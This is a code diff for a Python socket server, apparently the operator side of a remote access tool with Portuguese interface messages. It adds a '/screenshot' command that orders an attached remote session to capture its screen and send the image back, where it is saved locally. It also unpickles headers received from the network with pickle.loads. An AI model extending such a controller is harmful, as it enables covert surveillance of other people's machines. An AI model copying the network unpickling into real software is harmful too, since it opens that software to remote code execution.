@@ -8,6 +8,7 @@ from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR
 from threading import Thread
 from getpass import getuser
 from pickle import loads
+from pathlib import Path
 from rich import print as printr
 from os import system, uname
 
@@ -35,6 +36,34 @@ class Server(object):
             self.userAttached = ''
         else:
             printr(f'[red] Você não está interagindo com nenhuma seção no momento.')
+
+    def checkFolders(self):
+        for folder in ['./screenshots']:
+            if not Path(folder).is_dir():
+                Path(folder).mkdir()
+
+    def saveReceivedFile(self, path, content):
+        with open(path, 'wb') as receivedFile:
+            receivedFile.write(content)
+
+    def receiveFile(self, connection, header):
+        received = b''
+        while len(received) < header['bytes']:
+            received += connection.recv(header['bytes'])
+        
+        self.saveReceivedFile(f'./screenshots/{header["namefile"]}.{header["extension"]}', received)
+
+    def screenshot(self, args):
+        self.checkFolders()
+
+        if self.userAttached:
+            connection = self.connectedUsers[self.userAttached]['conn']
+            connection.send('/screenshot'.encode())
+            header = loads(connection.recv(512))
+            self.receiveFile(connection, header)
+
+        else:
+            printr('[yellow] Não há nenhuma seção aberta no momento...')
 
     def addUser(self, data):
         self.connectedUsers.update({data['name']: data})
@@ -65,13 +94,16 @@ class Server(object):
     
     def showContact(self, args):
         printr(__contact__)
-    
+
     def showCodeAuthor(self, args):
         printr(__author__)
-    
+
+    def exit(self):
+        pass
+
     def availableCommands(self, args):
         print(''.join(f'  {command}\n' for command in self.allCommands().keys() ))
-    
+
     def internalcommands(self, args):
         print(''.join(f'  {command}\n' for command in self.allCommands().keys() if self.allCommands()[command]['local']))
 
@@ -81,22 +113,23 @@ class Server(object):
             "/detach": {"local": True, "action": self.detach},
             "/sessions": {"local": True, "action": self.showSessions},
             "/rmsession": {"local": True, "action": self.removeUser},
+            "/screenshot": {"local": False, "action": self.screenshot},
             "/author": {"local": True, "action": self.showCodeAuthor},
             "/contact": {"local": True, "action": self.showContact},
             "/version": {"local": True, "action": self.showVersion},
             "/internalcommands": {"local": True, "action": self.internalcommands},
             "/clear": {"local": True, "action": self.clearScreen},
-            "/exit": {"local": True, "action": "ainda tem que fazer essa funcao"}
+            "/exit": {"local": True, "action": self.exit}
         }
 
         commands.update({"/commands": {"local": True, "action": self.availableCommands}})
-        
+
         return commands
 
     def splitCommand(self, command):
         if self.allCommands().get(command[0]):
             return self.allCommands()[command[0]], command[1:]
-        
+
         return False, command[1:]
 
     def checkCommand(self, command):
@@ -144,6 +177,7 @@ class Server(object):
 
     def info(self):
         return f' Servidor aberto em {self.__Address[0]}:{self.__Address[1]}'
+        
     def run(self):
         try:
             self.configureSocket()
